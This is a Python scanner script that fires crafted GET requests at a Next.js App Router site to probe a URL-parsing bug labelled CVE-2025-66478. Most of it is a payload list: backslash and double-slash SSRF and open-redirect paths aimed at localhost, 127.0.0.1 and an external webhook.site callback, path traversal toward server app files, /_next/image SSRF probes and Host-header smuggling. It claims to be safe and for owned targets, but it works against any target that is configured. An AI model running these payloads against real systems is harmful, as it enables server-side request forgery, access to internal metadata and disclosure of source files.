#!/usr/bin/env python3
"""
next15_ultra_tester.py
Aggressive but non-destructive tester for CVE-2025-66478-like URL parsing bugs in Next.js App Router.
Only performs safe GET requests (no payload uploads, no authentication, no destructive actions).

Usage:
  1. Edit TARGET and PROVE_URL below (PROVE_URL is optional; used to correlate if server actually fetches it).
  2. python3 next15_ultra_tester.py
Output:
  - prints progress to stdout
  - writes results to ultra_results.json
"""

import requests
import urllib.parse
import json
import time
import random
import string
import sys
from typing import List

# === CONFIGURE HERE ===
TARGET = "https://demo.djangocfg.com"               # target under your control
PROVE_URL = "https://en8q-xxxxxx.webhook.site/unique-id"  # webhook or receiver you control (optional)
OUTFILE = "ultra_results.json"
TIMEOUT = 8
SLEEP = 0.25
MAX_REDIRECTS = 6
HEADERS = {"User-Agent": "next15-ultra-tester/1.0"}
FOLLOW_REDIRECTS = False   # we handle redirects manually to inspect 'Location'
# ======================

assert TARGET.startswith("http"), "TARGET must start with http/https"

def randtag(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

TAG = randtag()
print(f"[+] Starting Next15 ULTRA Tester — tag={TAG}")
print("[+] Target:", TARGET)
if PROVE_URL:
    print("[+] Prove URL:", PROVE_URL)
print()

# --- utility encoders ---
def pct(s: str) -> str:
    return urllib.parse.quote(s, safe='')

def double_pct(s: str) -> str:
    return pct(pct(s))

def uhex_slash() -> str:
    # unicode fullwidth slash and backslash variations that sometimes bypass naive filters
    return "%EF%BC%8F"  # '／' fullwidth slash percent-encoded

def null_byte() -> str:
    return "%00"

# --- build mutation list ---
def build_payloads(prove: str) -> dict:
    p = urllib.parse.urlparse(prove) if prove else None
    host_only = p.netloc if p else ""
    payloads = {}

    # basic suspicious patterns (backslash, double)
    payloads["backslash_double_localhost"] = "/%5C%5Clocalhost:3000"
    payloads["backslash_127"] = "/%5Chttp://127.0.0.1:3000"
    payloads["double_slash_localhost"] = "//http://localhost:3000"
    payloads["double_slash_127"] = "//127.0.0.1:3000"

    # direct to prove with variations
    if prove:
        payloads["proto_backslash_prove"] = "/%5C" + prove
        payloads["proto_backslash_double_prove"] = "/%5C%5C" + prove
        payloads["proto_double_slash_prove"] = "//" + prove
        payloads["proto_pct_encoded"] = "/" + pct("\\http://") + host_only
        payloads["proto_double_pct"] = "/" + pct("\\\\http://") + host_only
        payloads["double_encoded_prove"] = "/" + double_pct("\\") + prove

    # double-encoding and weird percent-variants
    payloads["pct_backslash"] = "/%5C"  # single
    payloads["pct_pct_backslash"] = "/%255C"  # double-encoded
    payloads["pct_encoded_protocol_h"] = "/h%74tp://example.com"  # protocol obfuscation
    payloads["pct_encoded_https_prove"] = "/h%74tps://"+ (host_only if host_only else "example.com")

    # unicode/UTF variants
    payloads["unicode_fullwidth_slash"] = "/" + uhex_slash() + (prove if prove else "")
    payloads["null_byte_after_path"] = "/%5C%5Clocalhost:3000" + null_byte()

    # next-specific endpoints
    payloads["image_raw"] = "/_next/image?url=" + urllib.parse.quote("\\\\" + (prove if prove else "http://example.com")) + "&w=64&q=75"
    payloads["image_double"] = "/_next/image?url=" + urllib.parse.quote("//" + (prove if prove else "http://example.com")) + "&w=64&q=75"
    payloads["rsc_probe"] = "/%5C" + (host_only if host_only else "example.com") + "?_rsc=1"
    payloads["action_probe"] = "/%5C" + (host_only if host_only else "example.com") + "?__NEXT_ACTION__=1"
    payloads["next_data_traversal"] = "/_next/data/dev/app/%2E%2E/%2E%2E/server/app/page.js"
    payloads["next_static_traversal"] = "/_next/static/%2E%2E/%2E%2E/server/app/layout.js"
    payloads["login_next_param"] = "/login?next=%5C%5C" + urllib.parse.quote(prove if prove else "http://example.com")
    payloads["wellknown_backslash"] = "/.well-known/%5C" + (prove if prove else "http://example.com")

    # image + og combos
    payloads["og_image_probe"] = "/%5C" + (prove if prove else "http://example.com") + "/opengraph-image.png?tag=" + TAG
    payloads["og_hop_probe"] = "/og/%5C%5C" + (prove if prove else "http://example.com") + "?tag=" + TAG

    # rare chains
    payloads["rare_double_chain"] = "/%5C/%5C/" + (prove if prove else "http://example.com")
    payloads["mixed_double_encoded"] = "/%255C%5C" + (prove if prove else "http://example.com")

    # Host header smuggling variants (generated as endpoints then we will try sending Host override)
    payloads["host_smuggle_1"] = "/%5C%5C" + (prove if prove else "http://example.com")
    payloads["host_smuggle_2"] = "/%5C%5C127.0.0.1:80"

    # add some dynamic routes & api probes
    payloads["api_fetch_probe"] = "/api/fetch/%5C" + (prove if prove else "http://example.com")
    payloads["dynamic_user_probe"] = "/user/%5C%5C" + (prove if prove else "http://example.com")
    payloads["search_probe"] = "/search?q=%5C%5C" + urllib.parse.quote(prove if prove else "http://example.com")

    return payloads

# follow redirects manually to inspect intermediate Location headers
def send_and_walk(path: str, headers=None):
    if headers is None:
        headers = HEADERS
    url = TARGET + path
    try:
        r = requests.get(url, headers=headers, timeout=TIMEOUT, allow_redirects=False)
    except Exception as e:
        return {"error": str(e)}

    chain = []
    chain.append({"url": url, "status": r.status_code, "location": r.headers.get("location"), "snippet": r.text[:300] if r.text else ""})

    hops = 0
    while r.headers.get("location") and hops < MAX_REDIRECTS:
        loc = r.headers.get("location")
        # Resolve relative
        next_url = urllib.parse.urljoin(TARGET, loc)
        try:
            r = requests.get(next_url, headers=headers, timeout=TIMEOUT, allow_redirects=False)
        except Exception as e:
            chain.append({"error": str(e), "at": next_url})
            break
        chain.append({"url": next_url, "status": r.status_code, "location": r.headers.get("location"), "snippet": r.text[:300] if r.text else ""})
        hops += 1
    return {"initial": {"path": path, "final_status": chain[-1]["status"] if chain else None}, "chain": chain}

# detection heuristics (look for internal hosts or your prove url)
def detect_indicator(chain_list: List[dict], prove: str):
    combined = json.dumps(chain_list)
    indicators = []
    suspects = ["127.0.0.1", "localhost", "169.254.169.254", "10.", "192.168.", ".next/server"]
    for s in suspects:
        if s in combined:
            indicators.append(s)
    if prove and prove in combined:
        indicators.append("PROVE_URL")
    return indicators

def try_with_host_smuggling(path, host_override):
    # send requests with different Host and X-Forwarded-Host headers to detect host-parsing oddities
    headers = HEADERS.copy()
    headers["Host"] = host_override
    headers["X-Forwarded-Host"] = host_override
    return send_and_walk(path, headers=headers)

def main():
    results = {}
    payloads = build_payloads(PROVE_URL)

    # Attach a unique tag param to payloads that support it
    tag = f"ultra={TAG}"
    for name, p in payloads.items():
        if "?" in p:
            payloads[name] = p + "&" + tag
        else:
            payloads[name] = p + ("?" + tag)

    # Run through payloads
    for name, path in payloads.items():
        print(f"[>] Testing {name}: {path}")
        res = send_and_walk(path)
        indicators = detect_indicator(res.get("chain", []), PROVE_URL)
        results[name] = {"path": path, "res": res, "indicators": indicators}
        print("    -> status:", res.get("initial", {}).get("final_status"), " indicators:", indicators)
        time.sleep(SLEEP)

        # If path looks like host-smuggle candidate, test with host header variants
        if name.startswith("host_smuggle"):
            for hv in ["127.0.0.1", "localhost", urllib.parse.urlparse(PROVE_URL).netloc if PROVE_URL else "example.com"]:
                print(f"    -> host-smuggle try (Host={hv})")
                r2 = try_with_host_smuggling(path, hv)
                ind2 = detect_indicator(r2.get("chain", []), PROVE_URL)
                results[name + "_host_" + hv] = {"path": path, "res": r2, "indicators": ind2}
                print("       host-smuggle indicators:", ind2)
                time.sleep(SLEEP)

    # Save results
    summary = {"target": TARGET, "tag": TAG, "prove": PROVE_URL, "results": results}
    with open(OUTFILE, "w") as f:
        json.dump(summary, f, indent=2)

    # Print final summary
    print("\n[+] Scan complete. Summary:")
    found = False
    for name, info in results.items():
        inds = info.get("indicators", [])
        if inds:
            print(f"   !!! {name} → indicators: {inds}")
            found = True
    if not found:
        print("   No direct internal-host or prove-url indicators found in chains.")
    print(f"[+] Full JSON written to {OUTFILE}")
    print("[+] Now check your PROVE_URL (webhook/site) and server logs for any incoming requests with tag:", TAG)

if __name__ == "__main__":
    main()
